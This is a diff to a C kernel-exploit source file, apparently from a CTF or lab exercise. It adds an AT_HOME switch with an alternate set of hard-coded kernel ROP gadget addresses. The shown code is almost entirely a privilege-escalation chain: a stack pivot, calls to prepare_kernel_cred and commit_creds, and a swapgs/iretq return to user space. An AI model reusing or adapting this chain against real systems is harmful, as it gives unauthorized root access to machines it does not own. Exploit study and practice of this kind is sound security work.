@@ -12,10 +12,24 @@
 #include "../heap.h"
 #include "sof.h"
 
+#define AT_HOME
+
 int fd;
 
 unsigned long user_cs, user_ss, user_sp, user_rflags;
 
+#ifdef AT_HOME
+unsigned long stacklift = 0xffffffff81458a59; // : mov esp, 0x5b000000 ; pop rbp ; ret
+unsigned long newstack = 0x5b000000;
+unsigned long pop_rdi_ret = 0xffffffff81001568; // pop rdi; ret;
+unsigned long prepare_kernel_cred = 0xffffffff8108c220;
+unsigned long pop_rdx_ret = 0xffffffff8104a738; // pop rdx; ret;
+unsigned long cmp_rdx_8_jne_ret = 0xffffffff81aa4321; // cmp rdx, 8; jne; ret;
+unsigned long mov_rdi_rax_jne_xor_ret = 0xffffffff813e5f04; // mov rdi, rax; jne; xor eax, eax; ret;
+unsigned long commit_creds = 0xffffffff8108bde0;
+unsigned long swapgs_nop3_xor_ret = 0xffffffff81c01036; // swapgs; nop x 3; xor; ret;
+unsigned long iretq = 0xffffffff810261eb; // iretq
+#else
 unsigned long stacklift = 0xffffffff81457dc9; // mov esp, 0x5b000000 ; pop rbp ; ret
 unsigned long newstack = 0x5b000000;
 unsigned long pop_rdi_ret = 0xffffffff81001568; // pop rdi; ret;
@@ -26,7 +40,7 @@ unsigned long mov_rdi_rax_jne_xor_ret = 0xffffffff813e52e4; // mov rdi, rax; jne
 unsigned long commit_creds = 0xffffffff8108be00;
 unsigned long swapgs_nop3_xor_ret = 0xffffffff81c01036; // swapgs; nop x 3; xor; ret;
 unsigned long iretq = 0xffffffff810261db; // iretq
-
+#endif
 
 void save_state(){
     __asm__(
